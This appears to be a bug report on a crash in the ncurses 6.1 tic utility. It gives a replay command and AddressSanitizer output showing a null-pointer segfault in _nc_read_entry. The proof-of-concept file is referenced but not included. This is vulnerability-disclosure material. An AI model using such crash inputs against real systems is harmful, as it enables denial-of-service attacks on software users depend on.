
To replay,run `./progs/tic ./poc`

crash info

```
sec@ubuntu160432:~/tmp/ncurses/ncurses-6.1$ ./progs/tic ../poc 
"../poc", line 1, col 4095, terminal 'EE@': older tic versions may treat the description field as an alias
"../poc", line 1, col 4507, terminal 'EE@': Illegal character - '~?'
"../poc", line 1, col 4507, terminal 'EE@': unknown capability 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
"../poc", line 1, col 4632, terminal 'EE@': Illegal character - '^I'
"../poc", line 1, col 4632, terminal 'EE@': unknown capability 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
"../poc", line 1, col 4637, terminal 'EE@': Illegal character - '|'
"../poc", line 1, col 4637, terminal 'EE@': unknown capability 'vvfv'
"../poc", line 2, col 0, terminal 'EE@': Missing separator
"../poc", line 2, col 0, terminal 'EE@': Too much data, some is lost: mmmmmm:
"../poc", line 2, col 1, terminal 'EE@': Illegal character (expected alphanumeric or @%&*!#) - ':'
ASAN:SIGSEGV
=================================================================
==30357==ERROR: AddressSanitizer: SEGV on unknown address 0x00000000 (pc 0x0807d679 bp 0xbfffb3d8 sp 0xbfffb2f0 T0)
    #0 0x807d678 in _nc_read_entry (/home/sec/tmp/ncurses/ncurses-6.1/progs/tic+0x807d678)
    #1 0x8086949 in _nc_resolve_uses2 (/home/sec/tmp/ncurses/ncurses-6.1/progs/tic+0x8086949)
    #2 0x804cbb9 in main (/home/sec/tmp/ncurses/ncurses-6.1/progs/tic+0x804cbb9)
    #3 0xb78c1646 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18646)
    #4 0x80499b0  (/home/sec/tmp/ncurses/ncurses-6.1/progs/tic+0x80499b0)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV ??:0 _nc_read_entry
==30357==ABORTING
sec@ubuntu160432:~/tmp/ncurses/ncurses-6.1$ 
```

